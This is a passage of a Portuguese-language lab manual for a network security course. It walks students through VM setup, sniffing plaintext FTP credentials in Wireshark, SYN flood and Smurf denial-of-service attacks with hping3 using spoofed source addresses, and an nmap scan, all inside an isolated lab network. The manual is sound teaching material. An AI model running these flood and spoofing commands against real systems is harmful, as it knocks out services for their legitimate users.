<p>A máquina <em>WinServer-G</em> demanda uma pequena configuração adicional antes que estejamos prontos para começar os trabalhos. Vamos a ela:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Usando o 1) <em>Control Panel</em>, ou 2) clicando com o botão direito em <em>Computer</em> &gt; <em>Properties</em> no Windows Explorer ou 3) digitando <code>system</code> no menu iniciar, abra a tela de configuração do sistema como mostrado a seguir:</p>
<div id="img-winserver-system" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-11.png" alt="winserver 11">
</div>
<div class="title">Figure 23. Tela de configuração do sistema do WinServer</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Clique em <em>Change Settings</em>, e na aba <em>Computer Name</em>, no botão <em>Change&#8230;&#8203;</em>. Altere o nome do computador para <code>WinServer-G</code> e o <em>Workgroup</em> para <code>GRUPO</code>, como se segue. Depois, clique em <em>OK</em>.</p>
<div id="img-winserver-changename" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-12.png" alt="winserver 12">
</div>
<div class="title">Figure 24. Alteração de nome de máquina do WinServer</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Não reinicie o computador ainda. Na aba <em>Remote</em>, marque a caixa <em>Allow remote connections to this computer</em> e desmarque <em>Allow connections only from computers running Remote Desktop with Network Level Authentication</em>, como na imagem abaixo. Depois, clique em <em>Apply</em> e em seguida em <em>Restart Later</em>.</p>
<div id="img-winserver-rdesktop" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-13.png" alt="winserver 13">
</div>
<div class="title">Figure 25. Configurações de Remote Desktop do WinServer</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Agora, desabilite o firewall do Windows. Digite <code>firewall</code> no menu <em>Start</em> (alternativamente, clique em <em>Windows Defender Firewall</em> no <em>Control Panel</em>), em seguida em <em>Turn Windows Defender Firewall on or off</em>, e finalmente marque as caixas <em>Turn off Windows Defender Firewall</em> para ambas as rede Privada e Pública, como se segue:</p>
<div id="img-winserver-firewall" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-14.png" alt="winserver 14">
</div>
<div class="title">Figure 26. Desabilitar o firewall do WinServer</div>
</div>
</li>
<li>
<p>Clique em <em>OK</em> e reinicie a máquina <em>WinServer-G</em>.</p>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Após o <em>reboot</em>, acesse o <em>Server Manager</em> (que deverá ser iniciado automaticamente após o logon), e no canto superior direito clique em <em>Manage</em> &gt; <em>Add Roles and Features</em>.</p>
<div class="paragraph">
<p>Na janela <em>Before you begin</em>, clique em <em>Next</em> (opcionalmente, marque a caixa <em>Skip this page by default</em>).</p>
</div>
<div class="paragraph">
<p>Em <em>Select installation type</em>, mantenha <em>Role-based or feature-based installation</em> e clique em <em>Next</em>.</p>
</div>
<div id="img-winserver-role1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-15.png" alt="winserver 15">
</div>
<div class="title">Figure 27. Instalação de roles e features no WinServer, parte 1</div>
</div>
<div class="paragraph">
<p>Em <em>Select destination server</em>, mantenha <em>Select a server from the server pool</em> marcado e garanta que a máquina <em>WinServer-G</em> está selecionada na caixa <em>Server Pool</em>. Clique em <em>Next</em>.</p>
</div>
<div class="paragraph">
<p>Em <em>Select server roles</em>, marque a caixa <em>Web Server (IIS)</em>. Quando surgir a pergunta <em>Add features that are required for Web Server (IIS)?</em>, clique em <em>Add Features</em>, e depois em <em>Next</em>.</p>
</div>
<div id="img-winserver-role2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-16.png" alt="winserver 16">
</div>
<div class="title">Figure 28. Instalação de roles e features no WinServer, parte 2</div>
</div>
<div class="paragraph">
<p>Em <em>Select features</em>, clique em <em>Next</em>.</p>
</div>
<div class="paragraph">
<p>Em <em>Web Server Role (IIS)</em>, clique em <em>Next</em> para prosseguir.</p>
</div>
<div class="paragraph">
<p>A seguir, na janela <em>Select role services</em>, desça a barra de rolagem até o final e marque a caixa <em>FTP Server</em>, como se segue.</p>
</div>
<div id="img-winserver-role3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/winserver-17.png" alt="winserver 17">
</div>
<div class="title">Figure 29. Instalação de roles e features no WinServer, parte 3</div>
</div>
</li>
<li>
<p>Finalmente, clique em <em>Install</em> e aguarde. Ao final do processo, clique em <em>Close</em>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_11_exercitando_os_fundamentos_de_segurança">11) Exercitando os fundamentos de segurança</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Como vimos, o conceito de segurança mais básico apresentado consiste no CID (Confidencialidade, Integridade e Disponibilidade). Apresente três exemplos de quebra de segurança em cada um desses componentes, como por exemplo:</p>
<div class="ulist">
<ul>
<li>
<p>Planilha Excel corrompida.</p>
</li>
<li>
<p>Acesso não autorizado aos e-mails de uma conta de correio eletrônico.</p>
</li>
<li>
<p>Queda de um servidor web por conta de uma falha de energia elétrica.</p>
</li>
</ul>
</div>
</li>
<li>
<p>Associe cada um dos eventos abaixo a uma estratégia de segurança definida na parte teórica.</p>
<div class="ulist">
<ul>
<li>
<p>Utilizar um servidor web Linux e outro Windows 2019 Server para servir um mesmo conteúdo, utilizando alguma técnica para redirecionar o tráfego para os dois servidores.</p>
</li>
<li>
<p>Utilizar uma interface gráfica simplificada para configurar uma solução de segurança.</p>
</li>
<li>
<p>Configurar todos os acessos externos de modo que passem por um ponto único.</p>
</li>
<li>
<p>Um sistema de segurança em que caso falte energia elétrica, todos os acessos que passam por ele são bloqueados.</p>
</li>
<li>
<p>Configurar um sistema para só ser acessível através de redes confiáveis, para solicitar uma senha de acesso e em seguida verificar se o sistema de origem possui antivírus instalado.</p>
</li>
<li>
<p>Configurar as permissões de um servidor web para apenas ler arquivos da pasta onde estão as páginas HTML, sem nenhuma permissão de execução ou gravação em qualquer arquivo do sistema.</p>
</li>
</ul>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_12_normas_e_políticas_de_segurança">12) Normas e políticas de segurança</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Acesse o site do DSIC em <a href="http://dsic.planalto.gov.br/assuntos/editoria-c/instrucoes-normativas" class="bare">http://dsic.planalto.gov.br/assuntos/editoria-c/instrucoes-normativas</a> e leia a Instrução Normativa GSI/PR nº 1, de 13 de junho de 2008 e as normas complementares indicadas. Elas são um bom ponto de partida para a criação de uma Política de Segurança, de uma Equipe de Tratamento de Incidentes de Segurança, de um Plano de Continuidade de Negócios e para a implementação da Gestão de Riscos de Segurança da Informação.</p>
</li>
<li>
<p>Leia o texto da Política de Segurança da Informação da Secretaria de Direitos Humanos da Presidência da República, de 2012 (disponível na seção <em>Links Úteis e Leituras Recomendadas</em> do AVA, pasta <em>PoSIC</em>), e procure identificar os principais pontos na estruturação de uma PoSIC. Faça uma crítica construtiva do documento com vistas a identificar as principais dificuldades encontradas na elaboração de uma PoSIC.</p>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_2_explorando_vulnerabilidades_em_redes">Sessão 2: Explorando vulnerabilidades em redes</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_1_transferindo_arquivos_da_máquina_física_para_as_vms">1) Transferindo arquivos da máquina física para as VMs</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada em sua máquina física (hospedeira).</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Muito frequentemente teremos, neste curso, de mover programas e arquivos localizados na máquina física para uma das máquinas virtuais executando no Virtualbox. Para configurar o ambiente para que essas cópias sejam fáceis, siga os passos a seguir:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Dentro da console do Virtualbox de uma máquina virtual (neste exemplo, vamos usar a VM <em>WinServer-G</em>), acesse o menu <em>Devices</em> &gt; <em>Shared Folders</em> &gt; <em>Shared Folder Settings&#8230;&#8203;</em> .</p>
</li>
<li>
<p>Clique na pasta com o ícone <code>+</code> no canto superior da tela, que diz <em>Adds new shared folder</em>.</p>
</li>
<li>
<p>Em <em>Folder Path</em>, clique na seta e depois em <em>Other&#8230;&#8203;</em> . Em seguida, navegue até a pasta a ser compartilhada entre a máquina física e a VM e clique em <em>Select Folder</em>. Abaixo, marque as caixas <em>Auto-mount</em> e <em>Make Permanent</em>. Sua janela deve ficar assim:</p>
<div id="img-sharedfolder" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/virtualbox-1.png" alt="virtualbox 1">
</div>
<div class="title">Figure 30. Configuração de pasta compartilhada no Virtualbox</div>
</div>
</li>
<li>
<p>Agora, reinicie a máquina <em>WinServer-G</em>. Após o <em>reboot</em>, abra o Windows Explorer e verifique que há um novo local de rede montado. No exemplo abaixo, a pasta compartilhada tem o nome <em>shared</em>.</p>
<div id="img-sharedfolder-view" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/virtualbox-2.png" alt="virtualbox 2">
</div>
<div class="title">Figure 31. Visualização de pasta compartilhada no Virtualbox</div>
</div>
</li>
<li>
<p>Pronto! Agora, basta fazer o download de programas e arquivos em sua máquina física, colocá-los dentro da pasta compartilhada, e suas VMs terão acesso imediato. Para concluir, repita o procedimento para a máquina <em>WinClient-G</em>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_sniffers_para_captura_de_dados">2) <strong><em>Sniffers</em></strong> para captura de dados</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada na máquina virtual <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Como o usuário <em>Administrator</em>, copie o instalador do Wireshark (o arquivo <code>Wireshark-win64-3.0.0.exe</code> disponível na pasta <em>Programas</em> do curso) para a máquina <em>WinServer-G</em>, usando a pasta compartilhada configurada anteriormente. Inicie sua instalação.</p>
<div id="img-wireshark-1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wireshark-1.png" alt="wireshark 1">
</div>
<div class="title">Figure 32. Instalação do Wireshark, parte 1</div>
</div>
<div class="paragraph">
<p>Aceite todas as opções padrão do instalador. Confirme também a instalação do Npcap, uma dependência do Wireshark, com suas opções padrão.</p>
</div>
<div id="img-wireshark-2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wireshark-2.png" alt="wireshark 2">
</div>
<div class="title">Figure 33. Instalação do Wireshark, parte 2</div>
</div>
<div class="paragraph">
<p>Ao final do processo, inicie o Wireshark&#8201;&#8212;&#8201;você deverá ver uma janela como a que se segue:</p>
</div>
<div id="img-wireshark-3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wireshark-3.png" alt="wireshark 3">
</div>
<div class="title">Figure 34. Instalação do Wireshark, parte 3</div>
</div>
</li>
<li>
<p>Ative a captura de pacotes da placa de rede conectada à DMZ (o nome da interface deve ser <em>Ethernet</em>). Clique na barbatana azul no canto superior esquerdo da janela que diz <em>Start capturing packets</em>.</p>
</li>
<li>
<p>No campo <em>Apply a display filter</em>, digite <code>ftp</code> e pressione ENTER. A janela de captura deve ficar vazia, já que não há tráfego FTP acontecendo no momento.</p>
</li>
<li>
<p>Em outra janela, abra o <em>prompt</em> de comando do Windows (<code>cmd</code>) e digite o comando <code>ftp linorg.usp.br</code> . Em seguida, informe o usuário como sendo <code>aluno</code>, com senha <code>123456</code> .</p>
<div id="img-wireshark-4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wireshark-4.png" alt="wireshark 4">
</div>
<div class="title">Figure 35. Envio de usuário/senha por FTP</div>
</div>
</li>
<li>
<p>De volta ao Wireshark, pare a captura de pacotes e verifique se você consegue visualizar o usuário e a senha informados.</p>
<div class="paragraph">
<p>Na imagem abaixo podemos confirmar que, de fato, o usuário e senha são passados em claro pela rede.</p>
</div>
<div id="img-wireshark-5" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wireshark-5.png" alt="wireshark 5">
</div>
<div class="title">Figure 36. Captura de sessão FTP no Wireshark</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_ataque_syn_flood">3) Ataque SYN <strong><em>flood</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Agora, vamos identificar e compreender ataques DoS (<em>Denial of Service</em>) e fazer a análise com um <em>sniffer</em> (Wireshark e/ou <code>tcpdump</code>) para interpretar o modo como os pacotes são elaborados para o respectivo ataque DoS.</p>
</div>
<div class="paragraph">
<p>Primeiro, vamos investigar o ataque <em>SYN flood</em>. Como tratado na parte teórica do curso, esse ataque consiste em enviar uma grande número de pacotes com a flag SYN ativa. Para realizar o ataque, iremos utilizar a ferramenta <code>hping3</code>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Será necessário desativar a proteção contra <em>SYN Flooding</em> do kernel da máquina-alvo, que será a VM <em>FWGW1-G</em>. Altere o valor do parâmetro no arquivo <code>/proc/sys/net/ipv4/tcp_syncookies</code>.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /proc/sys/net/ipv4/tcp_syncookies
1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 0 &gt; /proc/sys/net/ipv4/tcp_syncookies</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos iniciar uma captura de pacotes, aguardando o ataque. Ainda na máquina <em>FWGW1-G</em>, use o <code>tcpdump</code> para monitorar os pacotes vindos da DMZ&#8201;&#8212;&#8201;através da interface <code>enp0s8</code>.</p>
<div class="literalblock">
<div class="content">
<pre># tcpdump ip -i enp0s8 -n host not 172.16.1.254
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes</pre>
</div>
</div>
<div class="paragraph">
<p>Note que o filtro acima exclui pacotes IPv6 e pacotes vindos da máquina física (que também encontra-se conectada à rede <em>host-only</em>, com o endereço 172.16.1.254), para não atrapalhar o processo de análise.</p>
</div>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, como usuário <code>root</code>, use o <code>hping3</code> para iniciar um ataque <em>SYN flood</em> com destino à máquina <em>FWGW1-G</em>, na porta do serviço SSH (com o objetivo, no caso do atacante, de esgotar os recursos de atendimento do serviço a usuários legítimos), com máxima velocidade de output e randomizando os IPs de origem dos pacotes.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># hping3 172.16.1.1 -S -p 22 --flood --rand-source
HPING 172.16.1.1 (enp0s3 172.16.1.1): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown</pre>
</div>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><code>-S</code> ativa a <em>flag</em> SYN nos pacotes.</p>
</li>
<li>
<p><code>-p 22</code> determina que a porta de destino será 22/TCP.</p>
</li>
<li>
<p><code>--flood</code> envia pacotes o mais rápido possível, sem mostrar respostas.</p>
</li>
<li>
<p><code>--rand-source</code> habilita o modo de envio com endereços de origem randomizados.</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Ainda com o <code>hping3</code> executando, volte à máquina <em>FWGW1-G</em> e verifique que o ataque está sendo realizado como esperado e interprete a saída do <code>tcpdump</code>. Tente abrir uma nova conexão <code>ssh</code>&#8201;&#8212;&#8201;o que acontece?</p>
<div class="paragraph">
<p>Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do <em>output</em> do <code>tcpdump</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>14:34:46.611124 IP 37.216.172.87.61777 &gt; 172.16.1.1.22: Flags [S], seq 1722418881, win 512, length 0
14:34:46.612051 IP 196.103.179.0.61789 &gt; 172.16.1.1.22: Flags [S], seq 656608080, win 512, length 0
14:34:46.612064 IP 237.165.139.119.61790 &gt; 172.16.1.1.22: Flags [S], seq 584215547, win 512, length 0
14:34:46.612069 IP 41.126.172.32.61791 &gt; 172.16.1.1.22: Flags [S], seq 520478412, win 512, length 0
14:34:46.612074 IP 164.4.165.114.61792 &gt; 172.16.1.1.22: Flags [S], seq 316807998, win 512, length 0
14:34:46.612079 IP 239.174.101.252.61793 &gt; 172.16.1.1.22: Flags [S], seq 797534175, win 512, length 0
14:34:46.612082 IP 80.98.63.179.61794 &gt; 172.16.1.1.22: Flags [S], seq 1624228209, win 512, length 0
14:34:46.612086 IP 92.168.164.203.61795 &gt; 172.16.1.1.22: Flags [S], seq 1084913676, win 512, length 0</pre>
</div>
</div>
<div class="paragraph">
<p>Note que os IPs de origem são todos distintos, como esperado. Além disso, todos possuem a <em>flag</em> SYN ativada e objetivam a porta 22/TCP do servidor, numa tentativa de exaurir recursos para tratamento de conexão de novos clientes.</p>
</div>
<div class="paragraph">
<p>Assim que o servidor recebe o SYN inicial, ele aloca memória para atender o cliente e responde com um SYN-ACK. No caso de um ataque SYN <em>flood</em>, como o desta atividade, o atacante envia um grande número de pacotes SYN sem qualquer intenção de responder o SYN-ACK recebido com um ACK (e, assim, fechar o <em>three-way handshake</em>). Se o atacante estiver usando endereços IP <em>spoofed</em>, o que estamos fazendo, o SYN-ACK sequer chega a ser recebido.</p>
</div>
<div class="paragraph">
<p>Durante este período o servidor não pode fechar a conexão com um pacote RST, e ela permanece aberta. Antes do <em>timeout</em>, outros pacotes SYN vindos do atacante chegam, e começam a deixar um número crescente de conexões em estado <em>half-open</em>. Eventualmente, as tabelas de <em>overflow</em> de conexão de servidor ficam cheias, e clientes legítimos têm seu acesso negado ao serviço. Para testar esse efeito, tente abrir uma nova conexão <code>ssh</code> com a máquina <em>FWGW1-G</em>&#8201;&#8212;&#8201;após algum tempo, o sistema nos retorna com <em>timeout</em>.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ssh aluno@172.16.1.1
ssh: connect to host 172.16.1.1 port 22: Connection timed out</pre>
</div>
</div>
<div class="paragraph">
<p>Para verificar a tabela de conexões corrente, podemos usar o comando <code>ss</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ss -nta | grep '^SYN-RECV' | head -n5
SYN-RECV   0      0      172.16.1.1:22                 142.97.227.2:36000
SYN-RECV   0      0      172.16.1.1:22                 15.198.184.201:18948
SYN-RECV   0      0      172.16.1.1:22                 21.212.184.142:2254
SYN-RECV   0      0      172.16.1.1:22                 201.62.25.47:18949
SYN-RECV   0      0      172.16.1.1:22                 14.55.146.26:18953</pre>
</div>
</div>
<div class="paragraph">
<p>Verificando a lista de conexões abertas e em espera pelo <code>ssh</code>, observamos o valor 128 no campo <em>Send-Q</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ss -nta | sed -n '1p;/^LISTEN.*:22/p' | grep -v ':::'
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      128          *:22                       *:*</pre>
</div>
</div>
<div class="paragraph">
<p>Esse campo denota o número de bytes não confirmados como recebidos pelo receptor, efetivamente configurando a fila de envio do sistema. Para mais detalhes sobre esse campo em particular, verifique a <em>manpage</em> do comando <code>netstat</code> via <code>man 8 netstat</code>.</p>
</div>
<div class="paragraph">
<p>O número 128 é idêntico aos <em>sysctls</em> <code>net.ipv4.tcp_max_syn_backlog</code> e <code>net.core.somaxconn</code>, como visualizado abaixo:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># sysctl -a | grep max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># sysctl -a | grep somaxconn
net.core.somaxconn = 128</pre>
</div>
</div>
<div class="paragraph">
<p>Esses <em>sysctls</em> são definidos como:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><code>net.ipv4.tcp_max_syn_backlog</code>: quantas conexões <em>half-open</em> para as quais um cliente ainda não enviou pacote ACK correspondente podem ser mantidas na fila do kernel. O valor padrão, como visto, é de 128. Se essa fila estiver cheia, clientes legítimos não poderão conectar-se, como observamos anteriormente.</p>
</li>
<li>
<p><code>net.core.somaxconn</code>: número máximo que o <em>sysctl</em> <code>net.ipv4.tcp_max_syn_backlog</code> pode assumir. Atua como um limite superior para o <em>sysctl</em> anterior.</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, pare a execução do <code>hping3</code> com <code>CTRL + C</code>. Em seguida, reative a proteção <em>TCP SYN Cookies</em> do kernel da máquina <em>FWGW1-G</em>.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A

# echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookies</pre>
</div>
</div>
<div class="paragraph">
<p>Os SYN <em>cookies</em> implementam uma proteção em que o servidor responde cada SYN inicial com um SYN-ACK contendo o hash criptográfico de um número de sequência construído a partir do endereço IP do cliente, número de porta e outras informações de identificação. Quando o cliente responde, esse hash deve ser incluído no pacote ACK. Finalmente, o servidor verifica esse ACK e só então aloca memória para a conexão. Leia mais sobre os SYN <em>cookies</em> em: <a href="https://cr.yp.to/syncookies.html" class="bare">https://cr.yp.to/syncookies.html</a> .</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_ataque_smurf">4) Ataque <strong><em>Smurf</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Agora, vamos trabalhar o ataque <em>Smurf</em>. Como já tratado na parte teórica deste curso, esse ataque consiste no envio de pacotes ICMP <em>echo-request</em> para o endereço de <em>broadcast</em> de uma rede desprotegida. Assim, todas as máquinas responderão para o endereço de origem especificado no pacote que deve estar alterado para o endereço alvo (efetivamente, realizando um <em>spoofing</em>).</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Será necessário desativar a proteção contra ICMP <em>echo-request</em> para endereço de broadcast no kernel da máquina-alvo, que será a VM <em>FWGW1-G</em>, bem como nas máquinas que responderão aos <em>echo-requests</em> (<em>KaliLinux-G</em> e <em>LinServer-G</em>). Altere o valor do parâmetro no arquivo <code>/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</code> nas três máquinas.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
</div>
</div>
</li>
<li>
<p>Inicie a captura de pacotes, aguardando o ataque. Na máquina <em>FWGW1-G</em>, use o <code>tcpdump</code> para monitorar os pacotes vindos da DMZ, através da interface <code>enp0s8</code>.</p>
<div class="literalblock">
<div class="content">
<pre># tcpdump ip -i enp0s8 -n host not 172.16.1.254
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes</pre>
</div>
</div>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, use o <code>hping3</code> para iniciar um ataque <em>Smurf</em> com destino à máquina <em>FWGW1-G</em>. Envie pacotes ICMP com a máxima velocidade possível para o endereço de <em>broadcast</em> da rede, falsificando a origem com o IP da vítima.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># hping3 172.16.1.255 --icmp --flood --spoof 172.16.1.1
HPING 172.16.1.255 (enp0s3 172.16.1.255): icmp mode set, 28 headers + 0 data bytes
hping in flood mode, no replies will be shown</pre>
</div>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><code>--icmp</code> ativa o modo ICMP; por padrão, o <code>hping3</code> envia pacotes do tipo <em>echo-request</em>, que é o que objetivamos.</p>
</li>
<li>
<p><code>--flood</code> envia pacotes o mais rápido possível, sem mostrar respostas.</p>
</li>
<li>
<p><code>--spoof 172.16.1.1</code> falsifica o IP de origem dos pacotes enviados para <em>broadcast</em> como sendo o IP da máquina <em>FWGW1-G</em>.</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>De volta à máquina <em>FWGW1-G</em>, verifique que o ataque está sendo realizado como esperado e interprete a saída do <code>tcpdump</code>.</p>
<div class="paragraph">
<p>Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do <em>output</em> do <code>tcpdump</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>14:56:31.489287 IP 172.16.1.1 &gt; 172.16.1.255: ICMP echo request, id 1036, seq 56940, length 8
14:56:31.489291 IP 172.16.1.30 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 57196, length 8
14:56:31.489292 IP 172.16.1.1 &gt; 172.16.1.255: ICMP echo request, id 1036, seq 57196, length 8
14:56:31.489294 IP 172.16.1.30 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 57452, length 8
14:56:31.489295 IP 172.16.1.1 &gt; 172.16.1.255: ICMP echo request, id 1036, seq 57452, length 8
14:56:31.489297 IP 172.16.1.30 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 57708, length 8
14:56:31.490336 IP 172.16.1.10 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 45932, length 8
14:56:31.490347 IP 172.16.1.10 &gt; 172.16.1.1: ICMP echo reply, id 1036, seq 46188, length 8</pre>
</div>
</div>
<div class="paragraph">
<p>Note que a máquina <em>FWGW1-G</em> identifica o seu próprio IP como sendo o originário dos pacotes <em>echo-request</em> enviados para <em>broadcast</em>. A seguir, as máquinas <em>LinServer-G</em> e <em>KaliLinux-G</em> (esta, a atacante), respondem em massa com ICMP <em>echo-replies</em> para a vítima, sobrecarregando seus recursos.</p>
</div>
<div class="paragraph">
<p>Finalmente, pode-se usar também a opção <code>-d</code> (ou <code>--data</code>, para <em>data size</em>) do <code>hping3</code>, fazendo com que o tamanho dos pacotes <em>echo-request</em>&#8201;&#8212;&#8201;e por conseguinte dos <em>echo-replies</em>&#8201;&#8212;&#8201;seja tão grande quanto o definido na linha de comando. Isso pode ser utilizado para dar mais força ao ataque, e consumir mais rapidamente a banda da vítima.</p>
</div>
</li>
<li>
<p>Reative a proteção para ignorar ICMP <em>echo-requests</em> direcionados a <em>broadcast</em> do kernel das máquinas <em>FWGW1-G</em>, <em>LinServer-G</em> e <em>KaliLinux-G</em>.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_5_levantamento_de_serviços_usando_o_nmap">5) Levantamento de serviços usando o <strong><em>nmap</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em>, <em>WinServer-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Agora, vamos entender o funcionamento e utilidades da ferramenta <code>nmap</code>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na máquina <em>WinServer-G</em>, inicie o Wireshark e faça-o escutar por pacotes vindos para a interface <em>Ethernet</em>. Em paralelo, na máquina <em>KaliLinux-G</em>, use o <code>nmap</code> para fazer um <em>scan</em> <em>verbose</em> da máquina <em>WinServer-G</em>. Analise e compare os resultados obtidos pelo <code>nmap</code> com o que foi observado no Wireshark.</p>
<div class="paragraph">
<p>Primeiro, vamos ver o que acontece na máquina <em>KaliLinux-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -v 172.16.1.20
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-08 02:41 -03
Initiating ARP Ping Scan at 02:41
Scanning 172.16.1.20 [1 port]
Completed ARP Ping Scan at 02:41, 0.00s elapsed (1 total hosts)
